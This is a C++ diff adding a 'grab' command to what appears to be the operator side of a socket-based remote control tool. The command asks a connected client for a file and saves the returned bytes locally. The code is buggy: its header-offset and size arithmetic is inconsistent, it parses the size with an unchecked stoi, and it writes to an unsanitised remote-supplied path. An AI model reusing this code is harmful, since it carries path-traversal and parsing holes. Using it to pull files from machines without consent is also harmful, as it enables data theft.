@@ -210,6 +210,9 @@ public: // Making everything public temporarily
         else if(cmd.substr(0, 3) == "cd "){
             this->cd(cmd.substr(3));
         }
+        else if(cmd.substr(0, 5) == "grab "){
+            this->grab(cmd.substr(5));
+        }
         else{
             this->plainTextMessageHistory.push_back("Unknown command: " + cmd);
         }
@@ -296,6 +299,63 @@ public: // Making everything public temporarily
         }
         std::string cdRecvBufferString = std::string(cdRecvBuffer); // Convert to a string for easier parsing
         this->plainTextMessageHistory.push_back(cdRecvBufferString);
+        this->sockFdMutex.unlock();
+    }
+
+    void grab(std::string path){
+        this->sockFdMutex.lock();
+        int bytesSent = send(this->sockFd, ("grab;" + path + ";").c_str(), path.length() + 6, 0);
+        if(bytesSent < 0){
+            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent));
+            this->sockFdMutex.unlock();
+            return;
+        }
+        // Receive the response from the client
+        // Unlike the previous commands, this one needs to receive an std::vector<char>
+        // The format for the received data is:
+        // "grab;[path];[file size];[file data]"
+        // First, read the file size so we known how much data to read
+        char grabRecvBuffer[4096] = {0};
+        unsigned long long int bytesReceivedTotal = 0;
+        int bytesReceived = recv(this->sockFd, grabRecvBuffer, 4096, 0);
+        if(bytesReceived < 0){
+            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
+            this->sockFdMutex.unlock();
+            return;
+        }
+        // Parse the response to get the file size
+        std::string grabRecvBufferString = std::string(grabRecvBuffer); // Cant use this string for any of the file data, because null terminated :(
+        if(grabRecvBufferString.substr(0, 5+path.size()+1) != "grab;" + path + ";" || grabRecvBufferString[5+path.size()+2] == '0'){
+            this->plainTextMessageHistory.push_back("ERR: Received bad response format or file not found");
+            this->sockFdMutex.unlock();
+            return;
+        }
+        unsigned long long int fileSize = std::stoi(grabRecvBufferString.substr(5+path.size()+1)); // unsafe
+        bytesReceivedTotal = bytesReceived-5-path.size()-1;
+        // Now that we know the file size, we can read the file data
+        std::vector<char> fileData;
+        fileData.reserve(fileSize);
+        for(unsigned int i = 0; i < bytesReceivedTotal; i++){
+            fileData.push_back(grabRecvBuffer[i+5+path.size()+1+std::to_string(fileSize).size()+1]); // disgusting
+        }
+        while(bytesReceivedTotal < fileSize){
+            bytesReceived = recv(this->sockFd, grabRecvBuffer, 4096, 0);
+            if(bytesReceived < 0){
+                this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived));
+                this->sockFdMutex.unlock();
+                return;
+            }
+            for(unsigned int i = 0; i < bytesReceived; i++){
+                fileData.push_back(grabRecvBuffer[i]);
+            }
+            bytesReceivedTotal += bytesReceived;
+        }
+        // Now that we have the file data, we can write it to a file
+        this->plainTextMessageHistory.push_back("Recieved " + std::to_string(bytesReceivedTotal) + " bytes of data");
+        std::ofstream of("./" + path, std::ios::binary);
+        of.write(fileData.data(), fileData.size());
+        of.close();
+        this->plainTextMessageHistory.push_back("File written to disk at ./" + path);
         this->sockFdMutex.unlock();
     }
 
